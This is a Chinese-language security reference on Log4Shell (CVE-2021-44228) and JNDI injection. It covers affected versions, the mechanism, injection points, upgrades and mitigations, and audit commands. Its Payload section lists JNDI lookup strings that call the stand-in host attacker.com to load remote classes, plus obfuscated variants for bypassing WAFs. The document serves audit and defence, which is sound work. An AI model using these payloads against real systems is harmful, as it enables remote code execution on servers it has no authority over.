# Log4Shell (CVE-2021-44228) 与 JNDI 注入

## 影响版本

- Log4j 2.x < 2.15.0（原始 RCE）
- Log4j 2.15.0 有部分绕过（CVE-2021-45046）
- Log4j 2.16.0 修复但仍存在 DoS（CVE-2021-45105）
- 最终修复：Log4j **2.17.1**+

## 原理

Log4j 支持 Lookup 表达式：`${env:USER}`, `${sys:os.name}`, `${jndi:ldap://x/y}`, ...

日志内容中的 `${jndi:...}` 被解释 → JNDI lookup → LDAP/RMI 服务器返回恶意 Reference
→ 加载远程 class → 触发 `newInstance()` → RCE。

## Payload

```
${jndi:ldap://attacker.com/x}
${jndi:rmi://attacker.com/x}
${jndi:dns://attacker.com}          # 仅用于探测
${${::-j}${::-n}${::-d}${::-i}:...} # WAF 绕过
${${lower:j}ndi:...}
${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://...}
```

## 常见入口

任何被日志记录的用户输入：

- `logger.info("Access from {}", request.getRemoteHost())` — 主机名？未必，多数是 IP
- `logger.info("UA: {}", request.getHeader("User-Agent"))` — ⚠️ 常见
- `logger.warn("Failed login for user {}", username)` — ⚠️
- `logger.error("Bad token: {}", token)` — ⚠️
- 邮件 subject / body
- URL query string
- Referer / X-Forwarded-For / X-Api-Version 等自定义 header
- File upload 文件名
- Kafka / MQ 消息体

## 修复

### 1. 升级 Log4j

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

Log4j 2.17.1+ 默认关闭 JNDI 全部协议 + 移除消息 Lookup。

### 2. 应急缓解（不能升级时）

- JVM 参数：`-Dlog4j2.formatMsgNoLookups=true`（2.10+ 生效，2.14.1 中已废弃，2.15+ 无效）
- 环境变量：`LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
- 删除 `JndiLookup.class`：
  ```bash
  zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  ```

### 3. Logback / SLF4j 也要看

Logback 早期版本存在类似 CVE-2021-42550（LOGBACK-1591）—— 通过 JNDI 加载配置文件。
影响 ≤ 1.2.7，升级到 1.2.9+。

### 4. 通用 JNDI 注入面

不仅 log4j，任何走 `Context.lookup(userInput)` 或 `InitialContext.lookup(userInput)`
的代码都危险。

```java
// ❌ 危险
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(userSuppliedName);

// ❌ Spring @JndiObjectFactoryBean 引用可控
```

## JDK 修复（自 8u191 / 11.0.1 / 17）

- `com.sun.jndi.ldap.object.trustURLCodebase=false` 默认
- `com.sun.jndi.rmi.object.trustURLCodebase=false` 默认

高版本 JDK 会拒绝加载远程类 → Log4Shell 需要走本地 gadget（如 Tomcat 自带类 + 反射）
或 LDAP Deserialization Reference 变种。

## 审计动作

```bash
# 查找 log4j-core 版本
find . -name 'log4j-core-*.jar' | xargs -n1 basename

# 项目中所有 dependency:tree
mvn dependency:tree -Dincludes=org.apache.logging.log4j
gradle dependencyInsight --dependency log4j-core

# 代码里的 JNDI lookup
grep -rn 'InitialContext.*lookup\|@JndiObjectFactoryBean\|jndi:' src/
```

- [ ] Log4j 版本 ≥ 2.17.1
- [ ] JDK 版本 ≥ 8u191 / 11.0.1
- [ ] 反代 WAF 是否过滤 `${jndi:` 变形
- [ ] 是否配置 `log4j2.formatMsgNoLookups=true` (double insurance)
- [ ] SLF4j Bridge 是否也升级

## 相关规则

- CWE: CWE-917 (JNDI Injection)
- CWE: CWE-502 (Deserialization if remote class)
- 内建 pattern: `log4shell_jndi`
- CVSS: 10.0
- 参考：https://logging.apache.org/log4j/2.x/security.html
